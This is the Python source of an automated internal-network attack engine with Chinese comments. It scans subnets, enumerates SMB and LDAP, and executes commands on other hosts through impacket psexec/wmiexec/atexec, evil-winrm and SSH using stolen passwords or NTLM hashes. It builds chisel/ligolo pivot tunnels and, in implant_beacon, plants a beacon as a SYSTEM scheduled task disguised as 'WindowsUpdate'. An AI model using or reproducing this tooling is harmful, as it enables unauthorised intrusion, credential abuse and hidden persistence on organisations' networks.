"""
内网横向移动引擎 v1.0 — Lateral Movement Engine
───────────────────────────────────────────
覆盖:
  • SMB/WMI/PSExec 横向 (Impacket)
  • WinRM 横向 (evil-winrm)
  • SSH 横向 + 密钥自动收集
  • BloodHound 数据采集 + 路径分析
  • 代理链自动搭建 (chisel/ligolo)
  • 多级跳板支持
  • 自动路由检测 + 可达性验证

工具依赖: impacket, netexec, evil-winrm, bloodhound-python, chisel, ligolo, proxychains4

用法:
  from .lateral_movement import LateralMover

  lm = LateralMover(project_id=5, callback=progress_cb)
  # 发现可达主机
  hosts = lm.discover(subnet="10.0.1.0/24", credential=("admin", "Passw0rd!"))
  # 尝试横向移动
  results = lm.move(hosts, method="auto")
  # BloodHound 分析攻击路径
  paths = lm.bloodhound_analyze("corp.local", "admin", "Passw0rd!")
"""

import subprocess, json, time, os, tempfile, re, ipaddress, socket
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Callable, Tuple, Set
from enum import Enum

from . import db

OUT = Path("/opt/deepseek-bot/playbook_output")
TMP = Path("/tmp/lateral")

# ==================== 枚举 ====================

class MoveMethod(Enum):
    SMB = "smb"           # psexec/smbexec
    WMI = "wmi"           # wmiexec
    WINRM = "winrm"       # evil-winrm
    SSH = "ssh"           # ssh + collected keys
    SCHTASKS = "schtasks" # 计划任务
    DCOM = "dcom"         # DCOM
    AUTO = "auto"         # 自动选择最优

class Protocol(Enum):
    SMB = 445
    WMI = 135
    WINRM_HTTP = 5985
    WINRM_HTTPS = 5986
    SSH = 22
    RDP = 3389
    LDAP = 389
    LDAPS = 636
    KERBEROS = 88
    MSSQL = 1433

# ==================== 数据模型 ====================

@dataclass
class HostInfo:
    """内网主机信息"""
    ip: str
    hostname: str = ""
    domain: str = ""
    os: str = ""                      # Windows/Linux
    os_version: str = ""              # 2019/Ubuntu 22.04
    open_ports: List[int] = field(default_factory=list)
    services: Dict[int, str] = field(default_factory=dict)
    smb_signing: bool = False         # SMB签名是否强制
    ldap_signing: bool = False
    reachable: bool = False
    via_proxy: bool = False
    last_seen: float = 0.0

@dataclass
class Credential:
    """凭据"""
    username: str
    password: str = ""
    nt_hash: str = ""                 # NTLM hash
    domain: str = ""
    source: str = ""                  # 来源: kerberoast/asrep/dump/loot
    target_host: str = ""             # 该凭据针对的主机
    is_admin: bool = False

@dataclass
class MoveResult:
    """横向移动结果"""
    target: HostInfo
    method: MoveMethod
    success: bool
    credential_used: Credential
    session_type: str = ""            # shell/smb/winrm
    output: str = ""
    error: str = ""
    elapsed: float = 0.0
    beacon_implanted: bool = False    # 是否植入持久化

@dataclass
class BloodHoundPath:
    """BloodHound 攻击路径"""
    source: str
    target: str
    path_type: str                    # AdminTo/CanRDP/HasSession/MemberOf
    edge_count: int
    edges: List[str] = field(default_factory=list)
    risk_score: int = 0               # 1-10

# ==================== 网络扫描 ====================

class NetworkScanner:
    """内网主机发现 — nmap/naabu/netexec 组合"""

    @staticmethod
    def ping_sweep(subnet: str) -> List[str]:
        """快速存活扫描"""
        alive = []
        try:
            net = ipaddress.ip_network(subnet, strict=False)
            # naabu 快速端口扫描
            cmd = f"naabu -host {subnet} -p 445,135,22,5985,3389 -silent -rate 3000 -timeout 1000 2>/dev/null"
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120).stdout
            for line in out.strip().split("\n"):
                if ":" in line:
                    ip = line.split(":")[0]
                    if ip not in alive:
                        alive.append(ip)
        except Exception:
            pass
        return alive

    @staticmethod
    def port_scan(host: str, ports: str = "22,135,139,445,3389,5985,5986,1433,389,636,88") -> Dict[int, str]:
        """单主机端口扫描"""
        result = {}
        try:
            cmd = f"nmap -Pn -n -p {ports} --open -T4 {host} -oG - 2>/dev/null"
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60).stdout
            for line in out.split("\n"):
                if "/open/" in line:
                    parts = line.split()
                    for p in parts:
                        if "/" in p and p[0].isdigit():
                            port_num = int(p.split("/")[0])
                            svc = p.split("/")[-1] if "/" in p else "unknown"
                            result[port_num] = svc
        except Exception:
            pass
        return result

    @staticmethod
    def smb_enum(host: str, cred: Tuple[str, str] = ("", "")) -> Dict:
        """SMB枚举 — 共享/用户/组"""
        info = {"shares": [], "users": [], "groups": [], "signing": False}
        try:
            user, pwd = cred
            auth = f"-u '{user}' -p '{pwd}'" if user else "--no-auth"
            cmd = f"netexec smb {host} {auth} --shares 2>/dev/null"
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30).stdout
            # 解析 SMB 签名
            if "signing:True" in out or "signing:true" in out:
                info["signing"] = True
            for line in out.split("\n"):
                if "SHARE" in line.upper():
                    info["shares"].append(line.strip())
        except Exception:
            pass
        return info

    @staticmethod
    def ldap_enum(host: str, domain: str, cred: Tuple[str, str]) -> Dict:
        """LDAP枚举 — 域控信息"""
        info = {"dc": "", "users": 0, "computers": 0, "groups": 0}
        try:
            user, pwd = cred
            cmd = f"netexec ldap {host} -d {domain} -u '{user}' -p '{pwd}' --users 2>/dev/null"
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60).stdout
            info["raw"] = out[:2000]
        except Exception:
            pass
        return info


# ==================== 横向移动执行器 ====================

class MoveExecutor:
    """单个横向移动方法执行"""

    @staticmethod
    def psexec(target: str, domain: str, user: str, password: str = "", nt_hash: str = "",
               command: str = "whoami") -> MoveResult:
        """Impacket psexec"""
        auth = f"{domain}/{user}:'{password}'" if password else f"{domain}/{user} -hashes :{nt_hash}"
        cmd = f"impacket-psexec -target-ip {target} {auth} '{command}' 2>&1"
        try:
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            success = "nt authority" in out.stdout.lower() or "administrator" in out.stdout.lower()
            return MoveResult(
                target=HostInfo(ip=target), method=MoveMethod.SMB,
                success=success, credential_used=Credential(username=user, password=password, domain=domain),
                session_type="shell", output=out.stdout[:1000],
                error=out.stderr[:500] if not success else "",
                elapsed=0
            )
        except Exception as e:
            return MoveResult(target=HostInfo(ip=target), method=MoveMethod.SMB,
                            success=False, credential_used=Credential(username=user),
                            error=str(e))

    @staticmethod
    def wmiexec(target: str, domain: str, user: str, password: str = "", nt_hash: str = "",
                command: str = "whoami") -> MoveResult:
        """Impacket wmiexec"""
        auth = f"{domain}/{user}:'{password}'" if password else f"{domain}/{user} -hashes :{nt_hash}"
        cmd = f"impacket-wmiexec -target-ip {target} {auth} '{command}' 2>&1"
        try:
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            success = "nt authority" in out.stdout.lower() or "administrator" in out.stdout.lower()
            return MoveResult(
                target=HostInfo(ip=target), method=MoveMethod.WMI,
                success=success, credential_used=Credential(username=user, password=password, domain=domain),
                session_type="shell", output=out.stdout[:1000], elapsed=0
            )
        except Exception as e:
            return MoveResult(target=HostInfo(ip=target), method=MoveMethod.WMI,
                            success=False, credential_used=Credential(username=user), error=str(e))

    @staticmethod
    def winrm(target: str, domain: str, user: str, password: str = "",
              command: str = "whoami") -> MoveResult:
        """evil-winrm"""
        cmd = f"evil-winrm -i {target} -u '{user}' -p '{password}' -s '{command}' 2>&1"
        if domain:
            cmd = f"evil-winrm -i {target} -u '{domain}\\{user}' -p '{password}' -s '{command}' 2>&1"
        try:
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            success = "Evil-WinRM" in out.stdout or "PS>" in out.stdout
            return MoveResult(
                target=HostInfo(ip=target), method=MoveMethod.WINRM,
                success=success, credential_used=Credential(username=user, password=password, domain=domain),
                session_type="winrm", output=out.stdout[:1000], elapsed=0
            )
        except Exception as e:
            return MoveResult(target=HostInfo(ip=target), method=MoveMethod.WINRM,
                            success=False, credential_used=Credential(username=user), error=str(e))

    @staticmethod
    def ssh_move(target: str, user: str, password: str = "", key_file: str = "",
                 command: str = "id") -> MoveResult:
        """SSH横向"""
        auth = f"sshpass -p '{password}' ssh" if password else f"ssh -i {key_file}"
        cmd = f"{auth} -o StrictHostKeyChecking=no -o ConnectTimeout=10 {user}@{target} '{command}' 2>&1"
        try:
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            success = "uid=" in out.stdout.lower() or out.returncode == 0
            return MoveResult(
                target=HostInfo(ip=target), method=MoveMethod.SSH,
                success=success, credential_used=Credential(username=user, password=password),
                session_type="ssh", output=out.stdout[:1000], elapsed=0
            )
        except Exception as e:
            return MoveResult(target=HostInfo(ip=target), method=MoveMethod.SSH,
                            success=False, credential_used=Credential(username=user), error=str(e))

    @staticmethod
    def atexec(target: str, domain: str, user: str, password: str = "", nt_hash: str = "",
               command: str = "whoami") -> MoveResult:
        """Impacket atexec (计划任务)"""
        auth = f"{domain}/{user}:'{password}'" if password else f"{domain}/{user} -hashes :{nt_hash}"
        cmd = f"impacket-atexec -target-ip {target} {auth} '{command}' 2>&1"
        try:
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return MoveResult(
                target=HostInfo(ip=target), method=MoveMethod.SCHTASKS,
                success=out.returncode == 0, credential_used=Credential(username=user, password=password, domain=domain),
                session_type="cmd", output=out.stdout[:1000], elapsed=0
            )
        except Exception as e:
            return MoveResult(target=HostInfo(ip=target), method=MoveMethod.SCHTASKS,
                            success=False, credential_used=Credential(username=user), error=str(e))


# ==================== 代理链管理 ====================

class ProxyChain:
    """代理链自动搭建 — chisel/ligolo + proxychains"""

    @staticmethod
    def deploy_chisel_server(port: int = 8080) -> Tuple[bool, str]:
        """在攻击机上启动chisel server"""
        try:
            # 后台启动
            cmd = f"chisel server -p {port} --reverse &"
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            # 验证
            check = subprocess.run(f"ss -tlnp | grep {port}", shell=True, capture_output=True, text=True, timeout=5)
            return ("LISTEN" in check.stdout, f"0.0.0.0:{port}")
        except Exception as e:
            return (False, str(e))

    @staticmethod
    def deploy_ligolo_proxy(port: int = 11601) -> Tuple[bool, str]:
        """ligolo-ng proxy模式"""
        try:
            # 创建 TUN 接口
            subprocess.run("ip tuntap add user root mode tun ligolo 2>/dev/null", shell=True)
            subprocess.run("ip link set ligolo up 2>/dev/null", shell=True)
            # 启动 proxy
            cmd = f"ligolo-proxy -l 0.0.0.0:{port} -selfcert &"
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            return (True, f"0.0.0.0:{port}")
        except Exception as e:
            return (False, str(e))

    @staticmethod
    def update_proxychains(socks_host: str = "127.0.0.1", socks_port: int = 1080) -> bool:
        """更新proxychains配置"""
        try:
            conf = "/etc/proxychains4.conf"
            content = f"""
strict_chain
proxy_dns
[ProxyList]
socks5 {socks_host} {socks_port}
"""
            Path(conf).write_text(content)
            return True
        except Exception:
            return False

    @staticmethod
    def test_through_proxy(target: str, port: int = 445) -> bool:
        """测试通过代理链能否到达目标"""
        try:
            cmd = f"proxychains4 -q nc -zv -w 5 {target} {port} 2>&1"
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            return "succeeded" in out.stderr.lower() or "open" in out.stderr.lower()
        except Exception:
            return False


# ==================== BloodHound 集成 ====================

class BloodHoundCollector:
    """BloodHound 数据采集 + 路径分析"""

    @staticmethod
    def collect(domain: str, user: str, password: str, dc_ip: str = "",
                collection_method: str = "All") -> str:
        """
        使用 bloodhound-python 采集数据。
        返回 JSON 文件路径。
        """
        TMP.mkdir(exist_ok=True)
        out_dir = TMP / f"bh_{domain}_{int(time.time())}"
        out_dir.mkdir(exist_ok=True)

        dc_param = f"-dc-ip {dc_ip}" if dc_ip else ""
        cmd = (f"bloodhound-python -d {domain} -u '{user}' -p '{password}' "
               f"-c {collection_method} {dc_param} --zip -op {out_dir} 2>&1")
        try:
            subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
            # 找生成的 ZIP
            zips = list(out_dir.glob("*.zip"))
            if zips:
                return str(zips[0])
        except Exception:
            pass
        return ""

    @staticmethod
    def analyze_shortest_path(source: str, target: str, domain: str) -> List[BloodHoundPath]:
        """
        分析最短攻击路径 (需要 BloodHound 数据库)
        简化版：基于 netexec 做可达性分析
        """
        paths = []
        try:
            # 用 netexec 检查直接关系
            cmd = f"netexec smb {target} --shares 2>/dev/null"
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30).stdout
            if "ADMIN$" in out:
                paths.append(BloodHoundPath(
                    source=source, target=target, path_type="AdminTo",
                    edge_count=1, edges=[f"{source} → AdminTo → {target}"], risk_score=9
                ))
            elif "C$" in out:
                paths.append(BloodHoundPath(
                    source=source, target=target, path_type="AdminTo",
                    edge_count=1, edges=[f"{source} → AdminTo → {target}"], risk_score=7
                ))
        except Exception:
            pass
        return paths


# ==================== 总控引擎 ====================

class LateralMover:
    """
    内网横向移动总控引擎
    
    用例:
      lm = LateralMover(project_id=5, callback=progress_cb)
      
      # 阶段1: 发现内网主机
      hosts = lm.discover("10.0.1.0/24", credential=("admin", "Passw0rd!"))
      
      # 阶段2: 横向移动（自动选择最优方法）
      results = lm.move(hosts, method=MoveMethod.AUTO)
      
      # 阶段3: BloodHound分析
      paths = lm.bloodhound_analyze("corp.local", "admin", "Passw0rd!")
      
      # 一键全流程
      report = lm.full_lateral("10.0.1.0/24", "corp.local", ("admin", "Passw0rd!"))
    """

    def __init__(self, project_id: int, uid: int = 0,
                 callback: Optional[Callable] = None):
        self.project_id = project_id
        self.uid = uid
        self.cb = callback or (lambda *a: None)
        self.scanner = NetworkScanner()
        self.executor = MoveExecutor()
        self.proxy = ProxyChain()
        self.bh = BloodHoundCollector()
        self._discovered_hosts: List[HostInfo] = []
        self._move_results: List[MoveResult] = []
        self._proxy_active = False
        self._socks_port = 1080

    def _step(self, tool: str, target: str, status: str, msg: str = ""):
        self.cb(tool, target, status, msg)
        if status == "running":
            db.scan_start(self.project_id, self.uid, tool, target)

    # ==================== 主机发现 ====================

    def discover(self, subnet: str, credential: Tuple[str, str] = ("", ""),
                 deep_scan: bool = False) -> List[HostInfo]:
        """
        发现内网存活主机 + 基本信息收集
        
        Args:
            subnet: CIDR格式 "10.0.1.0/24"
            credential: (user, password) 用于SMB/LDAP枚举
            deep_scan: 是否深度扫描每个主机
        """
        self._step("lateral-discover", subnet, "running", f"扫描子网 {subnet}")

        alive_ips = self.scanner.ping_sweep(subnet)
        hosts = []

        for ip in alive_ips:
            ports = self.scanner.port_scan(ip) if deep_scan else {}
            host = HostInfo(
                ip=ip,
                open_ports=list(ports.keys()),
                services=ports,
                reachable=True,
                last_seen=time.time()
            )
            hosts.append(host)
            self._step("lateral-discover", ip, "done", f"端口: {list(ports.keys())}")

        self._discovered_hosts = hosts
        self._step("lateral-discover", subnet, "done",
                   f"发现 {len(hosts)} 台存活主机")
        return hosts

    # ==================== 横向移动 ====================

    def move(self, hosts: List[HostInfo], method: MoveMethod = MoveMethod.AUTO,
             credentials: List[Credential] = None, command: str = "whoami",
             via_proxy: bool = False) -> List[MoveResult]:
        """
        对目标主机列表执行横向移动
        
        Args:
            hosts: 目标主机列表
            method: 移动方法 (AUTO自动选择)
            credentials: 凭据列表
            command: 执行的命令
            via_proxy: 是否通过代理链
        """
        if credentials is None:
            credentials = [Credential(username="Administrator", password="", domain="")]

        results = []

        for host in hosts:
            self._step("lateral-move", host.ip, "running", f"方法: {method.value}")

            for cred in credentials:
                result = None

                # 自动选择方法
                if method == MoveMethod.AUTO:
                    if 5985 in host.open_ports or 5986 in host.open_ports:
                        result = self.executor.winrm(host.ip, cred.domain, cred.username,
                                                     cred.password, command)
                    elif 445 in host.open_ports:
                        result = self.executor.psexec(host.ip, cred.domain, cred.username,
                                                      cred.password, cred.nt_hash, command)
                    elif 22 in host.open_ports:
                        result = self.executor.ssh_move(host.ip, cred.username,
                                                        cred.password, command)
                    elif 135 in host.open_ports:
                        result = self.executor.wmiexec(host.ip, cred.domain, cred.username,
                                                       cred.password, cred.nt_hash, command)
                # 指定方法
                elif method == MoveMethod.SMB:
                    result = self.executor.psexec(host.ip, cred.domain, cred.username,
                                                  cred.password, cred.nt_hash, command)
                elif method == MoveMethod.WMI:
                    result = self.executor.wmiexec(host.ip, cred.domain, cred.username,
                                                   cred.password, cred.nt_hash, command)
                elif method == MoveMethod.WINRM:
                    result = self.executor.winrm(host.ip, cred.domain, cred.username,
                                                 cred.password, command)
                elif method == MoveMethod.SSH:
                    result = self.executor.ssh_move(host.ip, cred.username,
                                                    cred.password, command)
                elif method == MoveMethod.SCHTASKS:
                    result = self.executor.atexec(host.ip, cred.domain, cred.username,
                                                  cred.password, cred.nt_hash, command)

                if result:
                    results.append(result)
                    if result.success:
                        self._step("lateral-move", host.ip, "done",
                                   f"✅ {method.value} 成功 - {cred.username}")
                        break  # 成功后不尝试其他凭据
                    else:
                        self._step("lateral-move", host.ip, "running",
                                   f"❌ {method.value} 失败 - {cred.username}: {result.error[:100]}")

            if not any(r.success and r.target.ip == host.ip for r in results):
                self._step("lateral-move", host.ip, "done", "❌ 所有方法失败")

        self._move_results = results
        return results

    # ==================== Beacon植入 ====================

    def implant_beacon(self, host: HostInfo, cred: Credential,
                       beacon_path: str = "/tmp/beacon.exe") -> MoveResult:
        """
        在目标主机植入持久化beacon
        
        Args:
            host: 目标主机
            cred: 有效凭据
            beacon_path: beacon文件路径
        """
        # 上传beacon
        upload_cmd = (
            f"impacket-smbserver -smb2support SHARE /tmp &"
            f"sleep 2 && "
            f"net use \\\\{host.ip}\\SHARE /user:{cred.domain}\\{cred.username} '{cred.password}' && "
            f"copy {beacon_path} \\\\{host.ip}\\SHARE\\beacon.exe"
        )
        try:
            subprocess.run(upload_cmd, shell=True, capture_output=True, text=True, timeout=30)

            # 创建计划任务持久化
            schtasks_cmd = (
                f"schtasks /CREATE /S {host.ip} /U {cred.domain}\\{cred.username} "
                f"/P '{cred.password}' /TN 'WindowsUpdate' /TR 'C:\\SHARE\\beacon.exe' "
                f"/SC ONSTART /RU SYSTEM /F"
            )
            out = subprocess.run(schtasks_cmd, shell=True, capture_output=True, text=True, timeout=30)

            return MoveResult(
                target=host, method=MoveMethod.SCHTASKS,
                success="SUCCESS" in out.stdout.upper(),
                credential_used=cred,
                beacon_implanted=True,
                output=out.stdout[:500]
            )
        except Exception as e:
            return MoveResult(
                target=host, method=MoveMethod.SCHTASKS,
                success=False, credential_used=cred, error=str(e)
            )

    # ==================== BloodHound 分析 ====================

    def bloodhound_analyze(self, domain: str, user: str, password: str,
                           dc_ip: str = "") -> List[BloodHoundPath]:
        """采集BloodHound数据并分析攻击路径"""
        self._step("bloodhound", domain, "running", "采集域数据...")
        zip_path = self.bh.collect(domain, user, password, dc_ip)

        if not zip_path:
            self._step("bloodhound", domain, "done", "❌ 采集失败")
            return []

        self._step("bloodhound", domain, "done", f"✅ 数据: {zip_path}")

        # 分析攻击路径
        paths = []
        for host in self._discovered_hosts:
            p = self.bh.analyze_shortest_path("OWNED", host.ip, domain)
            paths.extend(p)

        return paths

    # ==================== 代理链部署 ====================

    def setup_proxy(self, proxy_type: str = "chisel", port: int = 8080) -> Tuple[bool, str]:
        """部署代理链"""
        if proxy_type == "chisel":
            ok, addr = self.proxy.deploy_chisel_server(port)
            if ok:
                self.proxy.update_proxychains("127.0.0.1", port)
        else:
            ok, addr = self.proxy.deploy_ligolo_proxy(port or 11601)
            if ok:
                self.proxy.update_proxychains("127.0.0.1", 1080)

        self._proxy_active = ok
        self._socks_port = port
        return (ok, addr)

    # ==================== 一键全流程 ====================

    def full_lateral(self, subnet: str, domain: str,
                     master_cred: Tuple[str, str],
                     dc_ip: str = "") -> Dict[str, Any]:
        """
        一键内网全流程: 发现→移动→BloodHound→报告
        
        Returns:
            {
                "hosts_discovered": int,
                "hosts_compromised": int,
                "move_results": [...],
                "bloodhound_paths": [...],
                "summary": str
            }
        """
        report = {
            "subnet": subnet,
            "domain": domain,
            "started_at": time.time(),
            "hosts_discovered": 0,
            "hosts_compromised": 0,
            "move_results": [],
            "bloodhound_paths": [],
            "summary": ""
        }

        # 阶段1: 发现
        hosts = self.discover(subnet, master_cred, deep_scan=True)
        report["hosts_discovered"] = len(hosts)

        # 阶段2: 横向移动
        cred = Credential(username=master_cred[0], password=master_cred[1], domain=domain)
        results = self.move(hosts, MoveMethod.AUTO, [cred])
        report["move_results"] = [self._result_to_dict(r) for r in results]
        report["hosts_compromised"] = sum(1 for r in results if r.success)

        # 阶段3: BloodHound
        if domain:
            paths = self.bloodhound_analyze(domain, master_cred[0], master_cred[1], dc_ip)
            report["bloodhound_paths"] = [self._path_to_dict(p) for p in paths]

        # 生成摘要
        report["elapsed"] = time.time() - report["started_at"]
        report["summary"] = (
            f"内网横向移动报告\n"
            f"{'─'*50}\n"
            f"子网: {subnet}\n"
            f"域: {domain}\n"
            f"发现主机: {report['hosts_discovered']}\n"
            f"成功拿下: {report['hosts_compromised']}\n"
            f"成功率: {report['hosts_compromised'] / max(report['hosts_discovered'], 1) * 100:.0f}%\n"
            f"耗时: {report['elapsed']:.0f}s\n"
        )

        return report

    @staticmethod
    def _result_to_dict(r: MoveResult) -> Dict:
        return {
            "target": r.target.ip,
            "method": r.method.value,
            "success": r.success,
            "user": r.credential_used.username,
            "session_type": r.session_type,
            "output": r.output[:500],
            "error": r.error[:200],
            "beacon_implanted": r.beacon_implanted
        }

    @staticmethod
    def _path_to_dict(p: BloodHoundPath) -> Dict:
        return {
            "source": p.source,
            "target": p.target,
            "type": p.path_type,
            "edges": p.edges,
            "risk_score": p.risk_score
        }
